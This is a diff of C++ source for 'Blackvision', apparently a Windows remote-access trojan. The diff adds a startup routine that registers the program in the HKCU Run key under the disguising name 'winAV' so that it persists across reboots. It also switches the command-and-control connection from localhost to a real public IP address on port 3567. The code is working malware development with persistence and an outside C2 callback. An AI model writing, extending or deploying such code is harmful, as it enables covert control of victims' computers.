@@ -2,6 +2,30 @@
 #include "Blackvision.h"
 //#pragma warning (disable : 4996)
 
+void Blackvision::startup()
+{
+	TCHAR file[MAX_PATH];
+	HKEY NewVal;
+	int fpath = GetModuleFileName(NULL, file, MAX_PATH);
+	if (fpath == 0)
+	{
+		return;
+	}
+	if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
+	{
+		return;
+	}
+	if (RegSetValueEx(NewVal, "winAV", 0, REG_SZ, (LPBYTE)file, sizeof(file)) != ERROR_SUCCESS)
+	{
+		return;
+	}
+	else {
+		std::cout << "Program added to Startup.\n";
+	}
+	RegCloseKey(NewVal);
+	
+}
+
 void Blackvision::ExecuteFile(char* filename)
 {
 	STARTUPINFO si;
@@ -206,7 +230,7 @@ void Blackvision::respond(const char * data) {
 void Blackvision::C2Connect()
 {
 	WSADATA wsa;
-	DWORD timeout = 1000;
+	DWORD timeout = 3000;
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); };
 	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
@@ -216,7 +240,7 @@ void Blackvision::C2Connect()
 	}
 	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
 	
-	server.sin_addr.s_addr = inet_addr("127.0.0.1");
+	server.sin_addr.s_addr = inet_addr("159.89.214.31");
 	server.sin_port = htons(3567);
 	server.sin_family = AF_INET;
 
